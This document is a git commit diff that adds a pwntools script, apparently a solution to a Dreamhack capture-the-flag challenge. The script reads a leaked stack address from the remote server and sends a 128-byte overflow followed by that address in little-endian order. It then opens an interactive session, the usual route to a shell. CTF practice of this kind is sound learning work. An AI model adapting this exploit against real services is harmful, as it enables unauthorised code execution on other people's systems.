9d73f0ba80f4b766c589861578b76f83c2e99a0b
Brian <hibrian827@gmail.com>
2024-01-17 18:39:57 +0900

    deleted temp

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -1,4 +1,22 @@
 from pwn import remote
+import struct
 
-port = 24277
+port = 14573
 rem = remote("host3.dreamhack.games", port)
+
+rec = rem.recvline().decode('utf-8')
+start = rec.index('(') + 3
+end = rec.index(')')
+buf = rec[start : end]
+
+payload = b'A' * 128        #|       buf      |
+# payload += b'B' * 0x8        #|       SFP      |
+endian = ''
+for i in range(len(buf) // 2) :
+  endian += buf[len(buf) - 2 - i * 2 : len(buf) - i * 2]
+payload += bytes.fromhex(endian)
+print(payload)
+
+rem.sendline(payload)
+
+rem.interactive()
